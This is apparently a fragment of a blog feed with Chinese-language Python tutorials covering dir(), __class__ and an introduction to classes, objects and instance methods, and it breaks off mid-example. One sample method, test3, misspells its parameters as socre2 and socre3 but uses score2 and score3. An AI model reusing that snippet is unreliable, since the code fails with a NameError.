print(test.__class__.nums)</span></span><br><span class="line"><span class="built_in">print</span>(test.__class__.info())  <span class="comment"># 通过__class__ 可以获取到这个方法的返回值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __class__ 用的不多  因为python解释器在运行实例对象.方法(属性) 会自动帮助我们调用__class__</span></span><br></pre></td></tr></table></figure><h2 id="dir-方法"><a href="#dir-方法" class="headerlink" title="dir() 方法"></a><code>dir()</code> 方法</h2><p>既然我们知道了实例对象中有默认的<code>__class__</code>，那除了它之外还有哪些呢？怎么查看呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span>(实例对象)</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span>() </span><br><span class="line">函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；</span><br><span class="line">带参数时，返回参数的属性、方法列表。</span><br><span class="line">如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这么多的<code>__</code>开始的属性，用到什么我们就研究 什么，不用现在立刻研究。</p><p>python 内置方法有很多，无论是初学者还是精通python 的程序员都不能全部即住所有的方法，这时候 dir() 方法就非常有用了，使用 dir()函数可以查看对象内的所有的属性和方法，在 python 中任何东西都是对象，一种数据类型，一个模块等，都有子集的属性和方法，除了常用的方法外，其他的你不需要全部记住它，交给 dir() 函数就好了。</p><p>所有的属性方法包括，实例属性、类属性、实例方法、类方法等等</p><blockquote><p>从打印的结果来看，本质上实例对象只能保存实例属性，类对象保存类属性及各种方法。但是由于实例对象中有<code>__class__</code>的存在，指向了类对象，所以实例对象太过dir()打印的更全</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, address</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.address = address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;name:<span class="subst">&#123;self.name&#125;</span>, address: <span class="subst">&#123;self.address&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_nums</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;nums: <span class="subst">&#123;cls.nums&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建实例对象</span></span><br><span class="line">test = Test(<span class="string">&#x27;小小&#x27;</span>, <span class="string">&#x27;北京&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在想要知道当前这个实例对象中到底有什么</span></span><br><span class="line"><span class="comment"># dir()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(test))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[</span></span><br><span class="line"><span class="string">    &#x27;__class__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__delattr__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__dict__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__dir__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__doc__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__eq__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__format__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__ge__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__getattribute__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__gt__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__hash__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__init__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__init_subclass__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__le__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__lt__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__module__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__ne__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__new__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__reduce__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__reduce_ex__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__repr__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__setattr__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__sizeof__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__str__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__subclasshook__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__weakref__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;address&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;info&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;name&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;nums&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;print_nums&#x27;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(Test))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[</span></span><br><span class="line"><span class="string">    &#x27;__class__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__delattr__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__dict__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__dir__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__doc__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__eq__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__format__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__ge__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__getattribute__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__gt__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__hash__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__init__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__init_subclass__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__le__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__lt__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__module__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__ne__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__new__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__reduce__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__reduce_ex__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__repr__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__setattr__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__sizeof__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__str__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__subclasshook__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;__weakref__&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;info&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;nums&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;print_nums&#x27;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6. 初识面相对象</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/6.%20%E5%88%9D%E8%AF%86%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/6.%20%E5%88%9D%E8%AF%86%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>初识面相对象</p><h1 id="引入面相对象"><a href="#引入面相对象" class="headerlink" title="引入面相对象"></a>引入面相对象</h1><p>本节将通过一个案例，先用之前我们编写的代码方式进行实现，然后分析利弊。从而引出面向对象。</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>编写一个程序，完成1个学生的基本操作</p><ul><li>学生有姓名、年龄</li><li>可以输出学习信息（ 姓名、年龄）</li></ul><h2 id="使用面相过程的方式实现"><a href="#使用面相过程的方式实现" class="headerlink" title="使用面相过程的方式实现"></a>使用面相过程的方式实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 遍历打印所有姓名-年龄</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">names_temp, ages_temp</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;姓名:&quot;</span>, names_temp, <span class="string">&quot; 年龄:&quot;</span>, ages_temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个变量存储姓名</span></span><br><span class="line">name = <span class="string">&quot;顾安&quot;</span></span><br><span class="line"><span class="comment"># 定义一个变量存储年龄</span></span><br><span class="line">age = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历姓名-年龄</span></span><br><span class="line">print_info(name, age)</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从上述通过“面向过程”方式实现的代码中，我们可以发现代码行数不是很多，整个程序比较简单</p><p>但是上面的代码虽然看上去简单，实际上如果我们想要进行升级功能则不见得容易，例如：我们需要在上述的代码基础上进行修改实现3名同学的信息存储，那么应该怎么办呢？看看下面的方式是否可行？有什么不好的地方？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 遍历打印所有姓名-年龄</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">names_temp, ages_temp</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;姓名:&quot;</span>, names_temp, <span class="string">&quot; 年龄:&quot;</span>, ages_temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义第1个人的信息，然后输出</span></span><br><span class="line">name = <span class="string">&quot;顾安&quot;</span></span><br><span class="line">age = <span class="number">20</span></span><br><span class="line">print_info(name, age)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义第2个人的信息，然后输出</span></span><br><span class="line">name = <span class="string">&quot;双双&quot;</span></span><br><span class="line">age = <span class="number">22</span></span><br><span class="line">print_info(name, age)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义第3个人的信息，然后输出</span></span><br><span class="line">name = <span class="string">&quot;安娜&quot;</span></span><br><span class="line">age = <span class="number">23</span></span><br><span class="line">print_info(name, age)</span><br></pre></td></tr></table></figure><p>发现：为了实现存储3个学生信息，就用了3组变量 每组存储姓名、年龄，代码已经产生了较大冗余，如果要是存储30个学生信息想必这种方式肯定不好，代码太太太冗余</p><p>下面对代码进行优化：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 遍历打印所有姓名-年龄</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">names_temp, ages_temp</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;姓名:&quot;</span>, names_temp, <span class="string">&quot; 年龄:&quot;</span>, ages_temp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义第1个人的信息，然后输出</span></span><br><span class="line">names = [<span class="string">&quot;顾安&quot;</span>, <span class="string">&quot;双双&quot;</span>, <span class="string">&quot;安娜&quot;</span>]</span><br><span class="line">ages = [<span class="number">20</span>, <span class="number">22</span>, <span class="number">23</span>]</span><br><span class="line">print_info(names[<span class="number">0</span>], ages[<span class="number">0</span>])</span><br><span class="line">print_info(names[<span class="number">1</span>], ages[<span class="number">1</span>])</span><br><span class="line">print_info(names[<span class="number">2</span>], ages[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>上面我们使用了<code>列表</code>进行了升级，避免了定义多个变量的问题</p><p>你是否有这样的感觉，即便是升级了总感觉还是不够好</p><p>如果有这种感觉就对了，因为上面的这种方式就是“面向过程”开发，这种开发模式就是一步步的对需要的<code>数据</code>以及<code>方法</code>进行操作</p><p>因此出现代码“乱”的情况，在所难免。</p><h2 id="使用面向对象的方式实现"><a href="#使用面向对象的方式实现" class="headerlink" title="使用面向对象的方式实现"></a>使用面向对象的方式实现</h2><p>下面代码是使用面向对象开发模式，实现的1名同学信息的代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历打印所有姓名-年龄</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;姓名:&quot;</span>, self.name, <span class="string">&quot; 年龄:&quot;</span>, self.age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个对象</span></span><br><span class="line">p = Person(<span class="string">&quot;顾安&quot;</span>, <span class="number">20</span>)</span><br><span class="line">p.print_info()</span><br></pre></td></tr></table></figure><p>上述代码，第12行定义了一个<code>Person</code>类的变量<code>p</code>让这它指向一个对象，在这个对象中有<code>name</code>、<code>age</code>以及打印信息的功能代码（本节仅仅是引出面向对象的好处，详细的对象等知识接下来详细讲解），这样一来想要表示一个人就创建一个<code>Person</code>类的对象即可，如果不看第<code>1~10</code>行，只看第<code>12~13</code>行的话，就会有一种感觉“原来模拟创建一个人只需要这么简单的代码”</p><p>按照这个思路，如果想要创建3个人呢？见如下代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历打印所有姓名-年龄</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;姓名:&quot;</span>, self.name, <span class="string">&quot; 年龄:&quot;</span>, self.age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个对象</span></span><br><span class="line">p = Person(<span class="string">&quot;顾安&quot;</span>, <span class="number">20</span>)</span><br><span class="line">p.print_info()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建另外2个对象</span></span><br><span class="line">p2 = Person(<span class="string">&quot;双双&quot;</span>, <span class="number">22</span>)</span><br><span class="line">p2.print_info()</span><br><span class="line">p3 = Person(<span class="string">&quot;安娜&quot;</span>, <span class="number">23</span>)</span><br><span class="line">p3.print_info()</span><br></pre></td></tr></table></figure><h2 id="面向过程与面向对象的对比分析"><a href="#面向过程与面向对象的对比分析" class="headerlink" title="面向过程与面向对象的对比分析"></a>面向过程与面向对象的对比分析</h2><p>通过上述2种代码的实现方式（面向过程、面向对象）我们能够的粗以下几个结论：</p><ul><li>面向过程：根据业务逻辑从上到下写代码</li><li>面向对象：将数据与函数绑定到一起，进行封装，这样能够更快速的开发程序，减少了重复代码的重写过程</li><li>面向过程编程最易被初学者接受，其往往用一长段代码来实现指定功能，开发过程的思路是将数据与函数按照执行的逻辑顺序组织在一起，数据与函数分开考虑。</li></ul><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>面向对象编程(<code>Object Oriented Programming</code>-<code>OOP</code>) 是一种解决软件复用的设计和编程方法。</p><p>这种方法把软件系统中相近相似的操作逻辑和操作 应用数据、状态,以类的型式描述出来,以对象实例的形式在软件系统中复用,以达到提高软件开发效率的作用。</p><p>大白话来一句：面向对象能实现的功能，面向过程也能实现，往往程序的代码量都比较大，如果用面向过程的方式实现则代码冗余且不已升级，使用面向对象将数据与功能进行封装在中大程序开发中首先考虑使用</p><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>面向对象编程的2个非常重要的概念：类和对象</p><p>对象是面向对象编程的核心，在使用对象的过程中，为了将具有共同特征和行为的一组对象抽象定义，提出了另外一个新的概念——类</p><ul><li>类，就相当于制造飞机时的图纸，想象成模具</li><li>对象，就相当于创建的飞机，想象成通过模具制造出的物品</li></ul><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>人以类聚，物以群分。具有相似内部状态和运动规律的实体的集合(或统称为<code>抽象</code>)。 具有相同属性和行为事物的统称</p><p>类是抽象的,在使用的时候通常会找到这个类的一个具体的存在,使用这个具体的存在。一个类可以找到多个对象。</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="comment">#init的部分可以理解为生产属性的</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历打印所有姓名-年龄</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;姓名:&quot;</span>, self.name, <span class="string">&quot; 年龄:&quot;</span>, self.age)</span><br></pre></td></tr></table></figure><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>某一个具体事物的存在 ,在现实世界中可以是看得见摸得着的。可以是直接使用的</p><blockquote><p>实例化一个类之后返回的东西是这个对象的<strong>引用</strong></p></blockquote><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Person(<span class="string">&quot;安娜&quot;</span>, <span class="number">20</span>)  <span class="comment"># 执行完之后返回值就是对象的引用</span></span><br></pre></td></tr></table></figure><h2 id="类与对象的关系"><a href="#类与对象的关系" class="headerlink" title="类与对象的关系"></a>类与对象的关系</h2><p>先有类，通过类创建对象</p><p>用一个生活中的例子来说明：某公司在签署某个合同时往往需要在文件中盖章，在纸质合同上的印章图案就是对象，那么印章就是类。</p><p>一句话说明：类是模板，对象是类这个模板生产出来的具体的产品。</p><h2 id="类和实例对象内存中的存储"><a href="#类和实例对象内存中的存储" class="headerlink" title="类和实例对象内存中的存储"></a>类和实例对象内存中的存储</h2><blockquote><p>并注意到类和实例对象在内存中是存储在不通的位置！</p><p>类对象会在内存中存储<strong>类属性</strong>、<strong>方法(实例方法、静态方法、类方法）</strong></p><p>实例对象：只会存储<strong>实例属性</strong></p></blockquote><h2 id="类的构成"><a href="#类的构成" class="headerlink" title="类的构成"></a>类的构成</h2><p>类<code>class</code>由三个部分组成：</p><ul><li>类的<strong>名称</strong>:类名</li><li>类的<strong>属性</strong>:一组数据</li><li>类的**方法:**允许对进行操作的方法 (行为)</li></ul><p>示例：</p><ol><li>如何创建人物对象</li></ol><ul><li>事物名称(类名):人(Person)</li><li>属性:身高(height)、年龄(age)</li><li>方法(行为&#x2F;功能):跑(run)、打架(fight)</li></ul><ol start="2"><li>如何创建狗类对象</li></ol><ul><li>类名:狗(Dog)</li><li>属性:品种 、毛色、性别、名字、 腿儿的数量</li><li>方法(行为&#x2F;功能):叫 、跑、咬人、吃、摇尾巴</li></ul><h1 id="定义类与创建对象"><a href="#定义类与创建对象" class="headerlink" title="定义类与创建对象"></a>定义类与创建对象</h1><h2 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h2><p>格式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>:</span><br><span class="line">    方法列表</span><br></pre></td></tr></table></figure><blockquote><p>python3中不用写继承自(object)，会自动继承，python3中没有旧式类了，全都是新式类</p><p>一般都省略类名后面的括号</p></blockquote><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># class Hero:  # 经典类（旧式类）定义形式</span></span><br><span class="line"><span class="comment"># class Hero():</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):  <span class="comment"># 新式类定义形式</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;英雄各有见，何必问出处。&quot;</span>)</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><p>定义类时有2种形式：新式类和经典类，上面代码中的<code>Hero</code>为新式类，前两行注释部分则为经典类；</p></li><li><p><code>object</code> 是<code>Python</code> 里所有类的最顶级父类；</p></li><li><p>类名的命名规则按照<code>大驼峰命名法</code>；</p></li><li><p><code>info</code> 是一个<strong>实例方法</strong>，第一个参数一般是<code>self</code>，表示实例<strong>对象本身</strong>，当然了可以将<code>self</code>换为其它的名字，其作用是一个变量 这个变量指向了实例对象</p><p>实例方法只有在实例对象中才能使用</p></li></ul><blockquote><p>会学到的几种方法：</p><ul><li>实例方法</li><li>静态方法</li><li>类方法</li></ul><p><strong>静态方法和类方法没有权限访问实例属性，只有实例方法可以</strong></p></blockquote><h2 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h2><p><code>Python</code>中，可以根据已经定义的类去创建出一个或多个对象</p><p>创建对象的格式为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">变量名 = 类名()</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):  <span class="comment"># 新式类定义形式</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    info 是一个实例方法，类对象可以调用实例方法，实例方法的第一个参数一定是self</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;当对象调用实例方法时，Python会自动将对象本身的引用做为参数，</span></span><br><span class="line"><span class="string">            传递到实例方法的第一个参数self里&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(self) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;self各不同，对象是出处。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个对象</span></span><br><span class="line">h1 = Hero()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对象调用实例方法info()，执行info()里的代码</span></span><br><span class="line"><span class="comment"># . 表示选择属性或者方法</span></span><br><span class="line">h1.info()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(h1)  <span class="comment"># 打印对象，则默认打印对象在内存的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(h1))  <span class="comment"># id(h1) 则是内存地址的十进制形式表示</span></span><br></pre></td></tr></table></figure><h2 id="简单总结-1"><a href="#简单总结-1" class="headerlink" title="简单总结"></a>简单总结</h2><ul><li>先要用<code>class</code>定义类，然后再创建对象</li><li>为了便于以后学习<strong>类对象</strong>时进行区分对象，我们把上述代码创建出来的对象称之为<code>实例对象</code></li></ul><blockquote><p>注意区分实例对象和类对象（后面会学到）</p><ul><li>类对象： 就是类本身</li><li>实例对象： 由类实例化出来的对象</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   ...:     <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">   ...:         <span class="keyword">pass</span></span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="built_in">print</span>(Person)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.Person&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: p1 = Person()</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="built_in">print</span>(p1)</span><br><span class="line">&lt;__main__.Person <span class="built_in">object</span> at <span class="number">0x0000022E52AB0D30</span>&gt;</span><br></pre></td></tr></table></figure></blockquote><h1 id="实例属性与实例方法"><a href="#实例属性与实例方法" class="headerlink" title="实例属性与实例方法"></a>实例属性与实例方法</h1><h2 id="实例方法的概念"><a href="#实例方法的概念" class="headerlink" title="实例方法的概念"></a>实例方法的概念</h2><p>我们把创建出来的对象称之为：<code>实例对象</code>，简称<code>对象</code></p><p>所以当我们说<code>实例属性</code>时，就是指这个对象的属性</p><p>那什么是方法呢？</p><p>通俗的说：<code>方法</code>就<code>是</code>对象中定义的<code>函数</code>，用它来实现功能</p><h2 id="实例方法的定义"><a href="#实例方法的定义" class="headerlink" title="实例方法的定义"></a>实例方法的定义</h2><p>定义实例方法的方式与定义函数很类似，唯独不同点在于形参中的第一个参数是<code>self</code></p><blockquote><p><strong>Notice！</strong></p><p>实例方法的第一个参数一定是<code>self</code>!!即使不写也会默认传递</p><p>实例方法只能被实例时象所调用!那么这个实例方法是如何判斯调用者是不是一个实例对象呢?</p><p>通过实例对象调用这个方法的时候将这个实例对象传入到了这个方法里面，也就是传递self</p><p>self实际上就是创建的实例本身</p></blockquote><p>代码示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test1</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是一个方法&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">self, age</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;age=%d&quot;</span> % age)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test3</span>(<span class="params">self, score1, socre2, socre3</span>):</span><br><span class="line">        <span class="keyword">return</span> (score1 + score2 + score3) / <span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="实例方法的调用"><a href="#实例方法的调用" class="headerlink" title="实例方法的调用"></a>实例方法的调用</h2><p>函数的调用方式：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">函数名(实参)</span><br></pre></td></tr></table></figure><p>实例方法的调用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">实例对象.实例方法名(实参)</span><br></pre></td></tr></table></figure><p>示例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例方法</span></span><br><span 